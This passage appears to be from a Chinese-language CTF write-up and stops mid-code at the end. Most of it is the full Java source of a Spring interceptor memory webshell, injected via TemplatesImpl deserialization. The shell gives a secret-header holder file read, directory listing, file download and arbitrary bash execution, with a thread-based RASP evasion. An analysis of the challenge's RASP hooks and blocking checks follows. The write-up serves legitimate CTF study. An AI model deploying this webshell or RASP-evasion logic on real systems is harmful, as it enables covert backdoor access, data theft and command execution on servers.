class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Interceptor-based memory shell injected via TemplatesImpl deserialization.</span></span><br><span class="line"><span class="comment"> * Extends AbstractTranslet (required by TemplatesImpl) + implements HandlerInterceptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Triggered by: Header &quot;X-Cmd-Token: s3cretKey&quot;</span></span><br><span class="line"><span class="comment"> * Actions: read, list, download, exec (Thread bypass for RASP)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TOKEN_HEADER</span> <span class="operator">=</span> <span class="string">&quot;X-Cmd-Token&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TOKEN_VALUE</span> <span class="operator">=</span> <span class="string">&quot;s3cretKey&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registerInterceptor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">registerInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> getWebApplicationContext();</span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, AbstractHandlerMapping&gt; mappings =</span><br><span class="line">        context.getBeansOfType(AbstractHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (AbstractHandlerMapping mapping : mappings.values()) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            List&lt;Object&gt; interceptors = (List&lt;Object&gt;) f.get(mapping);</span><br><span class="line">            <span class="keyword">if</span> (interceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">for</span> (Object obj : interceptors) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (obj.getClass().getName().equals(<span class="built_in">this</span>.getClass().getName())) &#123;</span><br><span class="line">                        exists = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!exists) &#123;</span><br><span class="line">                    interceptors.add(<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> WebApplicationContext <span class="title function_">getWebApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Method 1: Spring RequestContextHolder (works when triggered from DispatcherServlet)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attrs</span> <span class="operator">=</span></span><br><span class="line">            (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> (WebApplicationContext) attrs.getRequest().getServletContext()</span><br><span class="line">                                         .getAttribute(<span class="string">&quot;org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (ctx != <span class="literal">null</span>) <span class="keyword">return</span> ctx;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Method 2: CXF PhaseInterceptorChain (works during SOAP request processing)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">message</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.cxf.phase.PhaseInterceptorChain&quot;</span>)</span><br><span class="line">                    .getMethod(<span class="string">&quot;getCurrentMessage&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (message != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> message.getClass().getMethod(<span class="string">&quot;get&quot;</span>, Object.class)</span><br><span class="line">                        .invoke(message, <span class="string">&quot;HTTP.REQUEST&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (req <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">                    javax.servlet.<span class="type">ServletContext</span> <span class="variable">sc</span> <span class="operator">=</span> ((HttpServletRequest) req).getServletContext();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> sc.getAttribute(</span><br><span class="line">                            <span class="string">&quot;org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (ctx == <span class="literal">null</span>) &#123;</span><br><span class="line">                        ctx = sc.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> WebApplicationContext) <span class="keyword">return</span> (WebApplicationContext) ctx;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Method 3: ContextLoader (traditional Spring with ContextLoaderListener)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> org.springframework.web.context.ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==================== HandlerInterceptor ====================</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">                             Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(TOKEN_HEADER);</span><br><span class="line">        <span class="keyword">if</span> (!TOKEN_VALUE.equals(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>) action = <span class="string">&quot;read&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;read&quot;</span>:</span><br><span class="line">                    doRead(request, response);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;list&quot;</span>:</span><br><span class="line">                    doList(request, response);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;download&quot;</span>:</span><br><span class="line">                    doDownload(request, response);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;exec&quot;</span>:</span><br><span class="line">                    doExec(request, response);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    text(response, <span class="number">400</span>, <span class="string">&quot;Unknown action. Supported: read, list, download, exec&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            text(response, <span class="number">500</span>, <span class="string">&quot;ERROR: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==================== Actions ====================</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doRead</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span> || path.isEmpty()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Missing parameter: path&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            text(resp, <span class="number">404</span>, <span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.isFile()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Not a file: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.canRead()) &#123;</span><br><span class="line">            text(resp, <span class="number">403</span>, <span class="string">&quot;Permission denied: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = fis.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                out.write(buf, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doList</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span> || path.isEmpty()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Missing parameter: path&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">            text(resp, <span class="number">404</span>, <span class="string">&quot;Path not found: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!dir.isDirectory()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Not a directory: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File[] files = dir.listFiles();</span><br><span class="line">        <span class="keyword">if</span> (files == <span class="literal">null</span>) &#123;</span><br><span class="line">            text(resp, <span class="number">403</span>, <span class="string">&quot;Permission denied: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Arrays.sort(files, (a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.isDirectory() != b.isDirectory()) &#123;</span><br><span class="line">                <span class="keyword">return</span> a.isDirectory() ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a.getName().compareToIgnoreCase(b.getName());</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;Directory: &quot;</span>).append(dir.getAbsolutePath())</span><br><span class="line">                .append(<span class="string">&quot; (&quot;</span>).append(files.length).append(<span class="string">&quot; items)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sb.append(String.format(<span class="string">&quot;%-6s %5s %5s %12s  %-19s  %s\n&quot;</span>,</span><br><span class="line">                <span class="string">&quot;TYPE&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;SIZE&quot;</span>, <span class="string">&quot;MODIFIED&quot;</span>, <span class="string">&quot;NAME&quot;</span>));</span><br><span class="line">        sb.append(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (File f : files) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%-6s %5s %5s %12s  %-19s  %s\n&quot;</span>,</span><br><span class="line">                    f.isDirectory() ? <span class="string">&quot;[DIR]&quot;</span> : <span class="string">&quot;[FILE]&quot;</span>,</span><br><span class="line">                    f.canRead() ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                    f.canWrite() ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                    f.isFile() ? String.valueOf(f.length()) : <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                    sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>(f.lastModified())),</span><br><span class="line">                    f.getName()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        text(resp, <span class="number">200</span>, sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doDownload</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span> || path.isEmpty()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Missing parameter: path&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists() || !file.isFile()) &#123;</span><br><span class="line">            text(resp, <span class="number">404</span>, <span class="string">&quot;Not a file: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.canRead()) &#123;</span><br><span class="line">            text(resp, <span class="number">403</span>, <span class="string">&quot;Permission denied: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + file.getName() + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        resp.setContentLengthLong(file.length());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = fis.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                out.write(buf, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doExec</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="literal">null</span> || cmd.isEmpty()) &#123;</span><br><span class="line">            text(resp, <span class="number">400</span>, <span class="string">&quot;Missing parameter: cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CmdRunner</span> <span class="variable">runner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CmdRunner</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        runner.start();</span><br><span class="line">        runner.join(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">        text(resp, <span class="number">200</span>, runner.getOutput());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==================== Helpers ====================</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">text</span><span class="params">(HttpServletResponse resp, <span class="type">int</span> status, String body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setStatus(status);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(body);</span><br><span class="line">        resp.getWriter().flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==================== AbstractTranslet (required stubs) ====================</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784975415677-d0282609-dfee-455f-86df-7c7ab469055e.png"  alt="img"></p>
+<p>然后用download模式把rasp.jar下载到本地即可。</p>
+<p>列根目录也能发现，flag.txt是没有读权限的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784976099260-567bc69e-1af5-4b89-b042-a5b2b0ef6edb.png"  alt="img"></p>
+<p>但是getflag有执行权限，明显是把任意文件读获取flag这条路给堵死。</p>
+<p>下载rasp后，分析<strong>Agent 入口</strong> (<code>RaspAgent.premain</code>)：</p>
+<ol>
+<li>将 RASP jar 加入 <strong>bootstrap classpath</strong>（确保 JDK 核心类中注入的代码能访问 <code>RaspChecker</code>）</li>
+<li>注册 <code>RaspTransformer</code>（<code>ClassFileTransformer</code>）</li>
+<li>设置 <code>NativeMethodPrefix = &quot;$$rasp$$&quot;</code>（用于 hook native 方法）</li>
+<li>对已加载的目标类执行 <code>retransformClasses</code></li>
+</ol>
+<p><strong>Hook 点</strong>（4 个目标类，覆盖所有命令执行路径）：</p>
+<table>
+<thead>
+<tr>
+<th>目标类</th>
+<th>Hook 方法</th>
+<th>拦截目的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>java.lang.Runtime</code></td>
+<td><code>exec</code> (所有重载)</td>
+<td>标准命令执行入口</td>
+</tr>
+<tr>
+<td><code>java.lang.Runtime</code></td>
+<td><code>load</code>, <code>loadLibrary</code></td>
+<td>防止上传 .so 后通过 JNI 绕过</td>
+</tr>
+<tr>
+<td><code>java.lang.ProcessBuilder</code></td>
+<td><code>start</code></td>
+<td>ProcessBuilder 方式执行</td>
+</tr>
+<tr>
+<td><code>java.lang.ProcessImpl</code>&#x2F;<code>UNIXProcess</code></td>
+<td><code>&lt;init&gt;</code>, <code>start</code>, <code>forkAndExec</code>(native)</td>
+<td>最底层拦截，防反射调用</td>
+</tr>
+</tbody></table>
+<p><strong>NativeMethodPrefix 机制</strong>（防止反射调用 native 方法绕过）：</p>
+<p>RASP 对 <code>ProcessImpl.forkAndExec</code>（Linux 进程创建的 native 方法）使用 <code>NativeMethodPrefix</code> 技术：</p>
+<ul>
+<li>原始 native 方法 <code>forkAndExec</code> 被 JVM 重命名为 <code>$$rasp$$forkAndExec</code></li>
+<li>RASP 生成新的 Java 方法 <code>forkAndExec</code>，在方法入口插入 <code>RaspChecker.shouldBlock()</code> 检查后再委托给 native 方法</li>
+<li>即使通过 <code>Unsafe.allocateInstance()</code> 跳过构造函数后反射调用 <code>forkAndExec</code>，也会被新的 wrapper 方法拦截</li>
+</ul>
+<p><strong>拦截判定逻辑</strong> (<code>RaspChecker.shouldBlock()</code>)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784975815948-321ef941-f409-461a-80e1-e9eea56884ea.png"  alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">shouldBlock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> currentThread.getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 1：线程名是否匹配 HTTP 请求处理线程</span></span><br><span class="line">    String[] HTTP_THREAD_PATTERNS = &#123;</span><br><span class="line">        <span class="string">&quot;http-nio-&quot;</span>, <span class="string">&quot;http-apr-&quot;</span>, <span class="string">&quot;catalina-exec-&quot;</span>,</span><br><span class="line">        <span class="string">&quot;exec-&quot;</span>, <span class="string">&quot;qtp&quot;</span>, <span class="string">&quot;XNIO-&quot;</span>, <span class="string">&quot;default task-&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isHttpThread</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (String pattern : HTTP_THREAD_PATTERNS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (threadName.contains(pattern)) &#123;</span><br><span class="line">            isHttpThread = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 2：调用栈中是否包含 Web 框架帧</span></span><br><span class="line">    <span class="keyword">if</span> (!isHttpThread) &#123;</span><br><span class="line">        String[] WEB_CONTEXT_FRAMES = &#123;</span><br><span class="line">            <span class="string">&quot;javax.servlet.&quot;</span>, <span class="string">&quot;jakarta.servlet.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.apache.catalina.&quot;</span>, <span class="string">&quot;org.apache.coyote.&quot;</span>, <span 